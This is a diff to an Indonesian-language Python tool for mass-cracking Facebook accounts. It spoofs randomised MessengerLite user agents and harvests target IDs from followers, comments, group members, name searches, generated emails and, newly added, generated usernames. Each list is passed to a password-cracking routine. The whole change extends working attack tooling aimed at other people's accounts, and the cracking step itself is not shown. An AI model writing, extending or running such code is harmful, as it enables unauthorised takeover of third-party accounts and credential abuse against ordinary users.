@@ -47,7 +47,8 @@ versi_app = str(random.randint(111111111,999999999))
 for z in range(200):
 	versi_android = str(random.randint(4,12))+".0.0"
 	versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
-	ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; vivo 1606 Build/MMB29M) [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/181448449;FBDM/"+"{density=1.5,width=540,height=960};"+"FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.mlite;FBDV/vivo 1606;FBSV/{versi_android};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+	ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; Nokia 7 plus Build/QKQ1.190828.002) [FBAN/MessengerLite;FBAV/{versi_chrome};FBBV/156649505;FBDM/"+"{density=2.625,width=1080,height=2034};"+"FBLC/en_US;FBRV/0;FBCR/Telia;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.mlite;FBDV/Nokia 7 plus;FBSV/{versi_android};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+#FBDM/"+"{density=1.5,width=540,height=960};"+"FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.mlite;FBDV/vivo 1606;FBSV/{versi_android};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
 #[FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/Airtel;FBMF/Facebook/lge;FBBD/FEVER;FBDV/FEVER;FBSV/{versi_android};FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=2.75,width=1080,height=2179};FB_FW/1;])"
 	if ua in ugent:pass
 	else:ugent.append(ua)
@@ -186,10 +187,10 @@ class Menu:
 		
 		###----------[ PANEL BIASA ]---------- ###
 		prints(Panel(f"{P2}{self.ip}",padding=(0,30),title=f"{H2}{nama}",subtitle=f"{H2}{self.negara}",style=f"{color_panel}"))
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. crack dari id publik  [{color_text}05{P2}]. crack dari pencarian nama
-[{color_text}02{P2}]. crack dari pengikut   [{color_text}06{P2}]. crack dari member grup
-[{color_text}03{P2}]. crack dari komentar   [{color_text}07{P2}]. crack dari file sendiri
-[{color_text}04{P2}]. crack dari random email""",width=80,padding=(0,7),style=f"{color_panel}"))
+		prints(Panel(f"""{P2}[{color_text}01{P2}]. crack dari id publik   [{color_text}05{P2}]. crack dari random username
+[{color_text}02{P2}]. crack dari pengikut    [{color_text}06{P2}]. crack dari pencarian nama
+[{color_text}03{P2}]. crack dari komentar    [{color_text}07{P2}]. crack dari member grup
+[{color_text}04{P2}]. crack dari random mail [{color_text}08{P2}]. crack dari file sendiri""",width=80,padding=(0,6),style=f"{color_panel}"))
 		prints(Panel(f"""{P2}ketik {H2}bot{P2} untuk ke menu bot dan ketik {H2}lain{P2} untuk ke menu lain""",width=80,padding=(0,6),style=f"{color_panel}"))
 		menu = console.input(f" {H2}• {P2}pilih menu : ")
 		
@@ -209,7 +210,7 @@ class Menu:
 			Dump(cookie).Dump_Komentar(f"https://mbasic.facebook.com/{user}")
 			Crack().atursandi()
 			
-		###----------[ KOMENTAR ]---------- ###
+		###----------[ EMAIL ]---------- ###
 		elif menu in["4","04"]:
 			prints(Panel(f"""{P2}masukan nama dan format email gunakan '@' di awal contoh @gmail.com""",width=80,style=f"{color_panel}"))
 			user = console.input(f" {H2}• {P2}masukan nama : ")
@@ -218,8 +219,16 @@ class Menu:
 			Dump(cookie).Dump_Email(user,format,limit)
 			Crack().atursandi()
 			
-		###----------[ PENCARIAN NAMA ]---------- ###
+		###----------[ USERNAME ]---------- ###
 		elif menu in["5","05"]:
+			prints(Panel(f"""{P2}masukan nama dan jika 2 kata bisa gunakan titik '.' sebagai pemisah""",width=80,style=f"{color_panel}"))
+			user = console.input(f" {H2}• {P2}masukan nama : ")
+			limit = console.input(f" {H2}• {P2}masukan limit : ")
+			Dump(cookie).Dump_Username(user,limit)
+			Crack().atursandi()
+			
+		###----------[ PENCARIAN NAMA ]---------- ###
+		elif menu in["6","06"]:
 			prints(Panel(f"""{P2}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",width=80,style=f"{color_panel}"))
 			user = console.input(f" {H2}• {P2}masukan nama : ")
 			common = open("asset/nama_indonesia","r").read().splitlines()
@@ -234,14 +243,14 @@ class Menu:
 			Crack().atursandi()
 		
 		###----------[ MEMBER GRUP ]---------- ###
-		elif menu in["6","06"]:
+		elif menu in["7","07"]:
 			prints(Panel(f"""{P2}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
 			user = console.input(f" {H2}• {P2}masukan id grup : ")
 			Dump(cookie).Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
 			Crack().atursandi()
 			
 		###----------[ FILE MASSAL ]---------- ###
-		elif menu in["7","07"]:
+		elif menu in["8","08"]:
 			prints(Panel(f"""{P2}masukan tempat file, pastikan izin ke penyimpanan sudah diaktifkan""",width=80,style=f"{color_panel}"))
 			user = console.input(f" {H2}• {P2}masukan tempat file : ")
 			Dump(cookie).Dump_File(user)
@@ -351,7 +360,7 @@ class Dump:
 				tampung.append(z)
 		except:pass
 		
-	###----------[ DUMP FILE ]---------- ###
+	###----------[ DUMP EMAIL ]---------- ###
 	def Dump_Email(self,nama,format,limit):
 		try:
 			for z in range(int(limit)):
@@ -361,6 +370,18 @@ class Dump:
 					email = str(nama)+str(z)+str(format)+"<=>"+str(nama)
 				if email in tampung:pass
 				else:tampung.append(email)
+		except:pass
+		
+	###----------[ DUMP USERNAME ]---------- ###
+	def Dump_Username(self,nama,limit):
+		try:
+			for z in range(int(limit)):
+				if "." in nama:
+					user = str(nama)+"."+str(z)+"<=>"+str(nama.replace("."," "))
+				else:
+					user = str(nama)+"."+str(z)+"<=>"+str(nama)
+				if user in tampung:pass
+				else:tampung.append(user)
 		except:pass
 
 ###----------[ BAGIAN CRACK ]---------- ###
